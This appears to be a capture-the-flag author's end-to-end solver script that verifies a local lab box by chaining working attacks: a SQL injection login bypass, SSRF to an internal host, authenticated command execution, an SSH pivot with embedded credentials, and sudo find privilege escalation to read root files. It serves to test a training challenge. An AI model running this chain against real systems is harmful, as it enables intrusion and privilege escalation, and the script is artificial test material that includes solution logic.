#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, python3 (+ pyjwt).
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
WEB_PORT=8008
BASE="http://$HOST:$WEB_PORT"
WAY_TOKEN="WAY-7a21-STATION"
VAULT_PASS="F3rrym4n-Vault!"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'god-the-ferryman:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

WORK=$(mktemp -d)
JAR="$WORK/jar.txt"
trap 'rm -rf "$WORK"' EXIT

# Runs $1 as a shell command on vault (as traveler), via: portal's SSRF
# -> waystation's authenticated /run RCE -> SSH pivot to vault. Base64
# end to end so no layer of quoting collides with another.
remote_vault() {
    local b64 inner
    b64=$(printf '%s' "$1" | base64 -w0)
    inner="sshpass -p $VAULT_PASS ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null traveler@vault \"echo $b64 | base64 -d | bash\""
    # stdout and stderr land concatenated on the same line with no
    # separator (ssh's host-key warning has no leading newline before
    # it) -- strip from the literal "Warning:" onward rather than
    # relying on line boundaries.
    curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/run?token=$WAY_TOKEN&cmd=$inner" "$BASE/admin/preview" \
        | sed 's/Warning: Permanently added.*//'
}

# 1
F1=$(curl -s "$BASE/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

# 2 (JWT payload decode, no cracking)
TOKEN=$(curl -s "$BASE/guest-token" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
F2=$(python3 -c "import jwt; print(jwt.decode('$TOKEN', options={'verify_signature': False})['note'])")
check 2 "$F2"

# 3 (SQL injection auth bypass -- no admin credential exists anywhere)
curl -s -c "$JAR" -d "username=' OR '1'='1' -- &password=x" "$BASE/login" -o /dev/null
F3=$(curl -s -b "$JAR" "$BASE/admin" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

# 4 (SSRF pivot to the never-published waystation)
F4=$(curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/" "$BASE/admin/preview" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 4 "$F4"

# 5 (recover the waystation auth token: base64 + single-byte XOR, key given in its own banner)
CONFIG_B64=$(curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/config" "$BASE/admin/preview")
CONFIG_PLAIN=$(python3 -c "
import base64
print(bytes(b ^ 0x3C for b in base64.b64decode('''$CONFIG_B64''')).decode())
")
F5=$(echo "$CONFIG_PLAIN" | sed -n 's/note=//p')
check 5 "$F5"

# 6 (authenticated RCE on waystation -> flag 6 + vault creds + fragment A)
WAY_OUT=$(curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/run?token=$WAY_TOKEN&cmd=cat+/opt/waystation/secret/flag6.txt" "$BASE/admin/preview")
F6=$(echo "$WAY_OUT" | sed -n '1p')
check 6 "$F6"
FRAG_A=$(echo "$WAY_OUT" | sed -n 's/.*fragment: //p')

# 7 (SSH pivot to vault, credentials recovered from flag 6)
F7=$(remote_vault 'cat flag7.txt' | tr -d '\n')
check 7 "$F7"

# 8 (sudo NOPASSWD misconfiguration -> root, + fragment B)
OUT8=$(remote_vault 'sudo find /root/flag8.txt -exec cat {} \;')
F8=$(echo "$OUT8" | sed -n '1p')
check 8 "$F8"
FRAG_B=$(echo "$OUT8" | sed -n 's/.*fragment: //p')

# 9 (root-only forensic log, + fragment C)
OUT9=$(remote_vault 'sudo find /root/ferryman_notes.log -exec cat {} \;')
F9=$(echo "$OUT9" | grep -oE 'HLC\{[a-f0-9]{10}\}' | tail -1)
check 9 "$F9"
FRAG_C=$(echo "$OUT9" | sed -n 's/.*Last fragment: \([a-f0-9]*\)".*/\1/p')

# 10 (combine all three fragments to decrypt the final dossier)
B64_DOSSIER=$(remote_vault 'sudo find /root/dossier.enc -exec base64 -w0 {} \;' | tr -d '\n')
echo "$B64_DOSSIER" | base64 -d > "$WORK/dossier.enc"
F10=$(python3 docker/flagcrypto.py decrypt "${FRAG_A}${FRAG_B}${FRAG_C}" "$WORK/dossier.enc" -)
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
